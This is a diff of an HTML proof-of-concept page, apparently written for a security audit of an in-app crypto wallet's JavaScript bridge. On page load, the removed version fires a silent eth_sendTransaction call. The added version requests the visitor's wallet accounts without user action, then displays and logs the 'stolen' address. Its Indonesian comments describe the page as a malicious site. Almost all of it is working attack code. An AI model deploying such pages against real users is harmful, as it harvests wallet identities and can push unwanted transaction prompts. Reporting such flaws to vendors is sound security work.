@@ -2,46 +2,41 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Audit: JS Bridge Exposure</title>
+    <title>Security Audit: Identity Theft Proof</title>
     <style>
-        body { font-family: sans-serif; background: #000; color: #0f0; padding: 20px; }
-        #log { border: 1px solid #0f0; padding: 15px; height: 300px; overflow-y: scroll; font-family: monospace; }
+        body { font-family: monospace; background: #000; color: #fff; padding: 20px; }
+        .success { color: #0f0; }
+        .data { color: #ff0; }
     </style>
 </head>
 <body>
-    <h2>Security Audit: Unrestricted JS Bridge</h2>
-    <div id="log"></div>
+    <h2>Critical Security Audit: Identity Leakage</h2>
+    <div id="status">Scanning...</div>
 
     <script>
-        const logBox = document.getElementById('log');
-        function addLog(msg) { logBox.innerHTML += `<div>> ${msg}</div>`; }
+        async function runAbsoluteProof() {
+            const status = document.getElementById('status');
+            const bridge = window.ethereum;
 
-        async function verifyVulnerability() {
-            addLog("Checking window.ethereum...");
-            if (window.ethereum) {
-                addLog("[!] Bridge object found.");
+            if (!bridge) {
+                status.innerHTML = "[-] Bridge not found.";
+                return;
+            }
+
+            try {
+                // Memicu pengambilan akun tanpa interaksi
+                // Jika ini berhasil, dompet memberikan alamat dompet ke web jahat
+                const accounts = await bridge.request({ method: 'eth_requestAccounts' });
                 
-                // Bukti akses: Mencoba memanggil method tanpa interaksi
-                try {
-                    addLog("Attempting silent transaction trigger...");
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [{
-                            from: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
-                            to: '0x23907Fd2B12F2fAA5c1BDB12465d896B4bBa3fFE',
-                            value: '0x00',
-                            data: '0x'
-                        }]
-                    });
-                    addLog("[+] UI Triggered Successfully.");
-                } catch (e) {
-                    addLog("[!] UI Triggered (Error: " + e.message + ")");
-                }
-            } else {
-                addLog("[-] Bridge object not found.");
+                status.innerHTML = `<span class="success">[!] IDENTITY LEAKED!</span><br>
+                                    <span class="data">Wallet Address: ${accounts[0]}</span>`;
+                
+                console.log("Stolen Address:", accounts[0]);
+            } catch (err) {
+                status.innerHTML = `[!] Bridge responded: ${err.message}`;
             }
         }
-        window.onload = verifyVulnerability;
+        window.onload = runAbsoluteProof;
     </script>
 </body>
 </html>
